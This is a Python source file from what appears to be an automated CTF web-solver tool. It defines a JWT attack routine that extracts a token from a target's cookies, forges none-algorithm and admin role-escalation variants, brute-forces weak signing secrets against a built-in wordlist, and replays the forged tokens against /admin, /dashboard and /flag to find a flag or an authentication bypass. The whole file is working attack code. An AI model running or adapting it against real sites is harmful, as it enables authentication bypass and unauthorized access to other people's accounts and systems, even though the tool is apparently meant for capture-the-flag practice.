"""yang_web.core.smart_solver._web 混入 _WebToken —— 令牌类攻击（JWT）。"""

from __future__ import annotations
import urllib.request
import urllib.error
import urllib.parse
from ._common import (_detect_php_source, _http_headers, _make_ssl_ctx, decode_body, find_flag, http_get)

class _WebToken:
    """令牌类攻击（JWT）。"""
    
    def _try_jwt_attack(self):
        """JWT 令牌检测与攻击.

        检测 Set-Cookie 中的 JWT token, 自动尝试:
        1. None 算法攻击 (多个变体)
        2. 角色提升 (role → admin)
        3. 弱密钥爆破
        4. 成功后用 forged JWT 访问受保护页面
        """
        self.log("JWT", "running", "JWT token detection & attack")
        
        # Step 1: 获取初始响应, 检测 JWT
        code, body, resp_headers = http_get(self.url)
        if not body:
            return
        
        # 检测 Set-Cookie 中的 JWT
        jwt_token = None
        jwt_cookie_name = None
        cookies = resp_headers.get('Set-Cookie') or resp_headers.get('set-cookie', '')
        if cookies:
            import re as re_mod
            jwt_match = re_mod.search(
                r'([\w.-]+)=((?:eyJ[A-Za-z0-9_-]+)\.(?:[A-Za-z0-9_-]+)\.(?:[A-Za-z0-9_-]+))',
                cookies
            )
            if jwt_match:
                jwt_cookie_name = jwt_match.group(1)
                jwt_token = jwt_match.group(2)
                self.log("JWT", "found", f"Cookie {jwt_cookie_name}={jwt_token[:40]}...")
        
        if not jwt_token:
            self.log("JWT", "none", "No JWT token found in response")
            return
        
        # Step 2: 解析 JWT
        from yang_web.core.jwt import decode_jwt, analyze_jwt, none_attack, none_attack_variants, role_escalation_attack
        
        header, payload, _ = decode_jwt(jwt_token)
        if not header:
            self.log("JWT", "error", "Failed to decode JWT")
            return
        
        self.log("JWT", "decoded", f"alg={header.get('alg')}, payload={payload}")
        
        # Step 3: 角色提升攻击 (最常用)
        self.log("JWT", "attack", "Trying role escalation via None alg variants...")
        variants = role_escalation_attack(jwt_token)
        
        for variant_name, forged_token, new_payload in variants:
            # 使用 forged JWT 访问主页或 /dashboard
            for test_path in ["/", "/dashboard", "/admin", "/flag"]:
                test_url = urllib.parse.urljoin(self.url.rstrip("/") + "/", test_path.lstrip("/"))
                headers = dict(_http_headers())
                headers["Cookie"] = f"{jwt_cookie_name}={forged_token}"
                try:
                    req = urllib.request.Request(test_url, headers=headers)
                    ctx = _make_ssl_ctx()
                    with urllib.request.urlopen(req, timeout=10, context=ctx) as resp:
                        rbody = resp.read()
                        rtext = decode_body(rbody)
                        # 检查是否跳转到登录页 (说明 bypass 失败)
                        if "login" in rtext.lower() and "admin" in rtext.lower():
                            continue  # still on login page
                        # 检查是否有 flag
                        f = find_flag(rtext)
                        if f:
                            self.flag = f
                            self.log("JWT", "flag!", f"{variant_name} → {test_path}: {f}")
                            return
                        # 检查是否进入了新页面 (不只是登录页)
                        if len(rtext) > 500 and "login" not in rtext.lower()[:200]:
                            self.log("JWT", "bypass!", f"{variant_name} → {test_path} ({len(rtext)}B, title check needed)")
                            # 标记 bypass 成功, 保存 cookie 供后续步骤使用
                            self._jwt_bypass_cookie = f"{jwt_cookie_name}={forged_token}"
                            self._jwt_bypass_url = self.url
                except Exception:
                    continue
        
        # Step 4: 弱密钥爆破
        self.log("JWT", "brute", "Trying weak secret brute force...")
        from yang_web.core.jwt import brute_jwt, forge_hs256, BUILTIN_WORDLIST
        matches = brute_jwt(jwt_token, BUILTIN_WORDLIST)
        if matches:
            secret, _ = matches[0]
            self.log("JWT", "cracked!", f"Secret = {secret}")
            # 使用破解的密钥伪造 admin token
            forged = forge_hs256(jwt_token, secret, {'user': 'admin', 'role': 'admin'})
            for test_path in ["/", "/dashboard", "/admin", "/flag"]:
                test_url = urllib.parse.urljoin(self.url.rstrip("/") + "/", test_path.lstrip("/"))
                headers = dict(_http_headers())
                headers["Cookie"] = f"{jwt_cookie_name}={forged}"
                try:
                    req = urllib.request.Request(test_url, headers=headers)
                    ctx = _make_ssl_ctx()
                    with urllib.request.urlopen(req, timeout=10, context=ctx) as resp:
                        rbody = resp.read()
                        f = find_flag(decode_body(rbody))
                        if f:
                            self.flag = f
                            self.log("JWT", "flag!", f"secret={secret}: {f}")
                            return
                except Exception:
                    continue
        else:
            self.log("JWT", "brute", "No match in builtin wordlist")
